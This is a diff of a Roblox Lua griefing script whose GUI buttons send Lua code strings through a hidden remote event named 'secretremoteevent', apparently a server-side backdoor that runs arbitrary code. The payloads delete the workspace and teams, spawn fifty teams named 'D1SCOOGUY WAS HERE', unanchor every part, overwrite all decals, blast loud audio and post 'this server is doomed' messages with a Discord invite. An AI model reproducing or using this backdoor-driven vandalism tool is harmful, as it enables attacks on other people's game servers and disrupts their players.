@@ -1197,7 +1197,8 @@ makeButton("Kick others", function()
 
   
 
-    makeButton("Skybox", function()
+  makeButton("Skybox", function()
+    secretremoteevent:FireServer([[
         for _, v in pairs(game.Lighting:GetChildren()) do
             if v:IsA("Sky") then
                 v:Destroy()
@@ -1212,104 +1213,91 @@ makeButton("Kick others", function()
         newSky.SkyboxRt = skyId
         newSky.SkyboxUp = skyId
         newSky.Parent = game.Lighting
-    end)
-
-makeButton("Team", function()
-    local TeamsService = game:GetService("Teams")
-
-    -- Eliminar todos los equipos existentes
-    for _, team in pairs(TeamsService:GetChildren()) do
-        if team:IsA("Team") then
-            team:Destroy()
-        end
-    end
-
-    -- Crear 10 equipos nuevos con el mismo nombre
-    for i = 1, 50 do
-        local team = Instance.new("Team")
-        team.Name = "D1SCOOGUY WAS HERE"
-        team.TeamColor = BrickColor.random()
-        team.AutoAssignable = false
-        team.Parent = TeamsService
-    end
+    ]])
 end)
 
+makeButton("Team", function()
+    secretremoteevent:FireServer([[
+        local TeamsService = game:GetService("Teams")
+        for _, team in pairs(TeamsService:GetChildren()) do
+            if team:IsA("Team") then
+                team:Destroy()
+            end
+        end
+        for i = 1, 50 do
+            local team = Instance.new("Team")
+            team.Name = "D1SCOOGUY WAS HERE"
+            team.TeamColor = BrickColor.random()
+            team.AutoAssignable = false
+            team.Parent = TeamsService
+        end
+    ]])
+end)
 
 makeButton("Speed all 50", function()
-    for _, plr in pairs(game.Players:GetPlayers()) do
-        local char = plr.Character
-        if char and char:FindFirstChild("Humanoid") then
-            char.Humanoid.WalkSpeed = 50
+    secretremoteevent:FireServer([[
+        for _, plr in pairs(game.Players:GetPlayers()) do
+            local char = plr.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.WalkSpeed = 50
+            end
         end
-    end
+    ]])
 end)
 
 makeButton("Unanchor", function()
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") then
-            obj.Anchored = false
+    secretremoteevent:FireServer([[
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                obj.Anchored = false
+            end
         end
-    end
+    ]])
 end)
-
-
 
 makeButton("Decal", function()
-    local newId = "rbxassetid://117745618486891"
-    local faces = {"Front", "Back", "Left", "Right", "Bottom", "Top"}
-
-    for _, obj in pairs(game:GetDescendants()) do
-        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
-            -- Primero borrar decals existentes en esas caras
-            for _, face in ipairs(faces) do
-                for _, child in pairs(obj:GetChildren()) do
-                    if child:IsA("Decal") and child.Face == Enum.NormalId[face] then
-                        child:Destroy()
+    secretremoteevent:FireServer([[
+        local newId = "rbxassetid://117745618486891"
+        local faces = {"Front", "Back", "Left", "Right", "Bottom", "Top"}
+        for _, obj in pairs(game:GetDescendants()) do
+            if obj:IsA("BasePart") or obj:IsA("MeshPart") then
+                for _, face in ipairs(faces) do
+                    for _, child in pairs(obj:GetChildren()) do
+                        if child:IsA("Decal") and child.Face == Enum.NormalId[face] then
+                            child:Destroy()
+                        end
                     end
                 end
-            end
-
-            -- Crear decal en cada cara
-            for _, face in ipairs(faces) do
-                local success, err = pcall(function()
-                    local decal = Instance.new("Decal")
-                    decal.Texture = newId
-                    decal.Face = Enum.NormalId[face]
-                    decal.Parent = obj
-                end)
-                if not success then
-                    -- Ignorar errores
+                for _, face in ipairs(faces) do
+                    local success, err = pcall(function()
+                        local decal = Instance.new("Decal")
+                        decal.Texture = newId
+                        decal.Face = Enum.NormalId[face]
+                        decal.Parent = obj
+                    end)
                 end
-            end
-
-        elseif obj:IsA("Decal") then
-            -- Actualizar decals existentes para que usen la nueva textura
-            local success, err = pcall(function()
-                obj.Texture = newId
-            end)
-            if not success then
-                -- Ignorar error
+            elseif obj:IsA("Decal") then
+                local success, err = pcall(function()
+                    obj.Texture = newId
+                end)
             end
         end
-    end
+    ]])
 end)
 
-
 makeButton("Clear workspace", function()
-    local function clearWorkspace()
+    secretremoteevent:FireServer([[
         for _, obj in pairs(game.Workspace:GetChildren()) do
             if obj ~= script then
                 pcall(function() obj:Destroy() end)
             end
         end
         task.wait()
-
         local baseplate = Instance.new("Part")
         baseplate.Anchored = true
         baseplate.Size = Vector3.new(99999, 5, 99999)
         baseplate.CFrame = CFrame.new(0, -6, 0)
         baseplate.Parent = game.Workspace
-
         local spawn = Instance.new("SpawnLocation")
         spawn.Anchored = true
         spawn.Size = Vector3.new(5, 1, 5)
@@ -1317,98 +1305,78 @@ makeButton("Clear workspace", function()
         spawn.CanCollide = false
         spawn.Transparency = 0.5
         spawn.Parent = game.Workspace
-
         task.wait(1)
-
         for _, p in ipairs(game.Players:GetPlayers()) do
             p:LoadCharacter()
         end
-    end
-
-    clearWorkspace()
+    ]])
 end)
 
-
-
-
-    makeButton("Announcement", function()
+makeButton("Announcement", function()
+    secretremoteevent:FireServer([[
         local msg = Instance.new("Message")
         msg.Text = "this server is doomed join .gg/Usbp5H738j "
         msg.Parent = workspace
         game.Debris:AddItem(msg, 20)
-    end)
+    ]])
+end)
 
-
-
-    makeButton("Hint", function()
-      local msg = Instance.new("Hint", game.Workspace)
-            msg.Text = "join the dsc gg/Usbp5H738j 🙏"
-    end)
-
-
-
+makeButton("Hint", function()
+    secretremoteevent:FireServer([[
+        local msg = Instance.new("Hint", game.Workspace)
+        msg.Text = "join the dsc gg/Usbp5H738j 🙏"
+    ]])
+end)
 
 makeButton("Particles", function()
-    for _, plr in pairs(game.Players:GetPlayers()) do
-        local char = plr.Character
-        if char then
-            -- Partes visibles del cuerpo
-            for _, part in pairs(char:GetDescendants()) do
-                if part:IsA("BasePart") and part.Transparency < 1 then
-                    -- Partículas negras corruptas
-                    local corruption = Instance.new("ParticleEmitter")
-                    corruption.Texture = "rbxassetid://121415027371137"
-                    corruption.Rate = 100
-                    corruption.Lifetime = NumberRange.new(2, 4)
-                    corruption.Speed = NumberRange.new(1, 8)
-                    corruption.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 2), NumberSequenceKeypoint.new(1, 0)})
-                    corruption.Transparency = NumberSequence.new(0.2)
-                    corruption.LightEmission = 0 -- para que se note más el decal
-                    corruption.VelocitySpread = 100
-                    corruption.Rotation = NumberRange.new(0, 200)
-                    corruption.RotSpeed = NumberRange.new(30)
-                    corruption.Parent = part
-
-                    -- Efecto de humo
+    secretremoteevent:FireServer([[
+        for _, plr in pairs(game.Players:GetPlayers()) do
+            local char = plr.Character
+            if char then
+                for _, part in pairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") and part.Transparency < 1 then
+                        local corruption = Instance.new("ParticleEmitter")
+                        corruption.Texture = "rbxassetid://121415027371137"
+                        corruption.Rate = 100
+                        corruption.Lifetime = NumberRange.new(2, 4)
+                        corruption.Speed = NumberRange.new(1, 8)
+                        corruption.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 2), NumberSequenceKeypoint.new(1, 0)})
+                        corruption.Transparency = NumberSequence.new(0.2)
+                        corruption.LightEmission = 0
+                        corruption.VelocitySpread = 100
+                        corruption.Rotation = NumberRange.new(0, 200)
+                        corruption.RotSpeed = NumberRange.new(30)
+                        corruption.Parent = part
+                    end
                 end
             end
         end
-    end
+    ]])
 end)
 
-
-
-
-    makeButton("Disco", function()
+makeButton("Disco", function()
+    secretremoteevent:FireServer([[
         local Lighting = game:GetService("Lighting")
-
         local fogStart = 0
         local fogEnd = 60
-
         local colorCorrection = Instance.new("ColorCorrectionEffect")
         colorCorrection.Name = "PartyEffect"
         colorCorrection.Saturation = 1
         colorCorrection.Brightness = 0.2
         colorCorrection.Contrast = 0.4
         colorCorrection.Parent = Lighting
-
         Lighting.FogStart = fogStart
         Lighting.FogEnd = fogEnd
-
         local running = true
-
         spawn(function()
             while running do
                 local hue = math.random()
                 local color = Color3.fromHSV(hue, 1, 1)
-
                 Lighting.FogColor = color
                 colorCorrection.TintColor = color
-
                 wait(0.05)
             end
         end)
-
         local discoLight = Instance.new("PointLight")
         discoLight.Brightness = 10
         discoLight.Range = 9999
@@ -1420,7 +1388,6 @@ end)
         part.Position = Vector3.new(0, 1000, 0)
         discoLight.Parent = part
         part.Parent = workspace
-
         delay(100000, function()
             running = false
             colorCorrection:Destroy()
@@ -1428,82 +1395,91 @@ end)
             Lighting.FogEnd = 100000
             part:Destroy()
         end)
-    end)
-
-	makeButton("Stop song", function()
-    if sound and sound.Parent then
-        sound:Destroy()
-    end
-    sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://0"
-    sound.Looped = false
-    sound.Volume = 15
-    sound.PlaybackSpeed = 1.0 -- ⬅️ Velocidad reducida
-    sound.Parent = workspace
-    sound:Play()
+    ]])
 end)
 
+makeButton("Stop song", function()
+    secretremoteevent:FireServer([[
+        if sound and sound.Parent then
+            sound:Destroy()
+        end
+        sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://0"
+        sound.Looped = false
+        sound.Volume = 15
+        sound.PlaybackSpeed = 1.0
+        sound.Parent = workspace
+        sound:Play()
+    ]])
+end)
 
-    makeButton("d1scooguy song", function()
+makeButton("d1scooguy song", function()
+    secretremoteevent:FireServer([[
         if sound and sound.Parent then
             sound:Destroy()
         end
         sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://1839246711"
-    sound.Looped = true
+        sound.Looped = true
         sound.Volume = 15
         sound.Parent = workspace
         sound:Play()
-    end)
-
-	makeButton("c00lkidd song", function()
-    if sound and sound.Parent then
-        sound:Destroy()
-    end
-    sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://95156028272944"
-    sound.Looped = true
-    sound.Volume = 15
-    sound.PlaybackSpeed = 0.18 -- ⬅️ Velocidad reducida
-    sound.Parent = workspace
-    sound:Play()
+    ]])
 end)
 
-
-
-
-
-	makeButton("sunburst song", function()
-    if sound and sound.Parent then
-        sound:Destroy()
-    end
-    sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://121336636707861"
-    sound.Looped = true
-    sound.Volume = 15
-    sound.PlaybackSpeed = 1.1 -- ⬅️ Velocidad reducida
-    sound.Parent = workspace
-    sound:Play()
+makeButton("c00lkidd song", function()
+    secretremoteevent:FireServer([[
+        if sound and sound.Parent then
+            sound:Destroy()
+        end
+        sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://95156028272944"
+        sound.Looped = true
+        sound.Volume = 15
+        sound.PlaybackSpeed = 0.18
+        sound.Parent = workspace
+        sound:Play()
+    ]])
 end)
 
-
-	makeButton("gangsta paradise song", function()
-    if sound and sound.Parent then
-        sound:Destroy()
-    end
-    sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://6070263388"
-    sound.Looped = true
-    sound.Volume = 100
-    sound.PlaybackSpeed = 1.0 -- ⬅️ Velocidad reducida
-    sound.Parent = workspace
-    sound:Play()
+makeButton("sunburst song", function()
+    secretremoteevent:FireServer([[
+        if sound and sound.Parent then
+            sound:Destroy()
+        end
+        sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://121336636707861"
+        sound.Looped = true
+        sound.Volume = 15
+        sound.PlaybackSpeed = 1.1
+        sound.Parent = workspace
+        sound:Play()
+    ]])
 end)
 
-    makeButton("Delete gui", function()
-        gui:Destroy()
-    end)
-end
+makeButton("gangsta paradise song", function()
+    secretremoteevent:FireServer([[
+        if sound and sound.Parent then
+            sound:Destroy()
+        end
+        sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://6070263388"
+        sound.Looped = true
+        sound.Volume = 100
+        sound.PlaybackSpeed = 1.0
+        sound.Parent = workspace
+        sound:Play()
+    ]])
+end)
+
+makeButton("Delete gui", function()
+    secretremoteevent:FireServer([[
+        if gui then
+            gui:Destroy()
+        end
+    ]])
+end)
+
 
 
 ]]
